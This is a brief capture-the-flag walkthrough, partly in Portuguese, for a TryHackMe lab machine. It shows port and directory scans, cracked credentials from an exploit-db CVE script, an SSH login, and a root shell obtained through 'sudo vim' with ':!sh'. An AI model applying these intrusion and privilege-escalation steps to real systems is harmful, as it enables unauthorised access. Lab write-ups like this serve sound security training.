### ROOM
https://tryhackme.com/room/easyctf

### IP
10.10.216.181

### NMAP
sudo nmap -sV -sS -p-3000 10.10.216.181
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-05 00:28 -03
Nmap scan report for 10.10.216.181 (10.10.216.181)
Host is up (0.22s latency).
Not shown: 2997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.72 seconds


### GoBuster
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.216.181
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/05 00:29:53 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/simple (Status: 301)
===============================================================
2020/10/05 00:31:38 Finished
===============================================================

### CVE Found
- https://www.exploit-db.com/exploits/46635
### On run cve.py get
- [+] Salt for password found: 1dac0d92e9fa6bb2
- [+] Username found: mitch
- [+] Email found: admin@admin.com
- [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
- [+] Password cracked: secret

### On enter in SSH
sudo ssh mitch@10.10.180.240 -p 2222
Run
- sudo -l 
sudo -l
User root may run the following commands on Machine:
    (ALL : ALL) ALL
Ou seja o vim pode executar comandos de root nesse user, então rodamos
sudo vim teste.txt
Dentro do vim :!sh
O sh abre um novo shell e usando o ! forçamos root
Então temos acesso root
 
